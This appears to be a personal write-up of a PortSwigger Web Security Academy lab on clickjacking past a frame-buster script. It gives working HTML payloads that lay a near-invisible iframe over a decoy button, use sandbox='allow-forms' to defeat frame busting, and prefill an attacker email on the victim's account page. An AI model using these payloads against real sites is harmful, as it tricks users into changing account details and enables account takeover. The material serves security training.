# Lab: Clickjacking with a frame buster script
# https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-frame-busting-scripts/clickjacking/lab-frame-buster-script#


```bash

<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.501;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 450px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe 
src="https://0a4300890394e01281fe617500a20043.web-security-academy.net/my-account?email=hackerc@gmail.com"></iframe>

# This page cannot be framed
```

```bash
# Add sanbox="allow-forms" to be able to frame the page.
# Deliver it to victim.

<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 450px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="https://0a4300890394e01281fe617500a20043.web-security-academy.net/my-account?email=hackerc@gmail.com"></iframe>

# You can also try this if it doesn't work:

<head>
    <style>
         iframe{
             position:relative;
             width:700px;
             height:600px;
             opacity:0.1;
             z-index:2;
            }
        div {
             position:absolute;
             z-index:1;
             top:450px;
             left:50px;
            }
   </style>
</head>
<body>

<div>Click me</div>

<iframe sandbox="allow-forms" src="https://0a0700fc04515d898014626800c5002e.web-security-academy.net/my-account?email=hacker@gmail.com"></iframe>

</body>

# An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute.
# A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts.
# These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:

#    check and enforce that the current application window is the main or top window,
#    make all frames visible,
#    prevent clicking on invisible frames,
#    intercept and flag potential clickjacking attacks to the user.

```
